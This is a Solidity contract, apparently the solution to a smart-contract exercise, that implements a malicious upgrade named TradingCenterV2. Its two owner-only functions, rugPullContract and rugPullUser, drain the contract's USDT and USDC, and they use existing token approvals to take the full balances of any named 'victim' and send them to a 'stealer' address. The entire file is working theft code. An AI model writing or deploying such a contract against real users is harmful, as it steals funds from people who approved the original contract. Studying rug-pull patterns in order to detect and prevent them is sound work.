// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import { TradingCenter, IERC20 } from "./TradingCenter.sol";
import { Ownable } from "./Ownable.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter, Ownable {
    constructor(address _usdt, address _usdc) {
        initialized = true;
        usdt = IERC20(_usdt);
        usdc = IERC20(_usdc);
    }

    function rugPullContract() external onlyOwner {
        uint256 amountUSDT = usdt.balanceOf(address(this));
        usdt.transfer(msg.sender, amountUSDT);
        uint256 amountUSDC = usdc.balanceOf(address(this));
        usdc.transfer(msg.sender, amountUSDC);
    }

    function rugPullUser(address victim, address stealer) external onlyOwner {
        uint256 amountUSDT = usdt.balanceOf(victim);
        usdt.transferFrom(victim, stealer, amountUSDT);
        uint256 amountUSDC = usdc.balanceOf(victim);
        usdc.transferFrom(victim, stealer, amountUSDC);
    }
}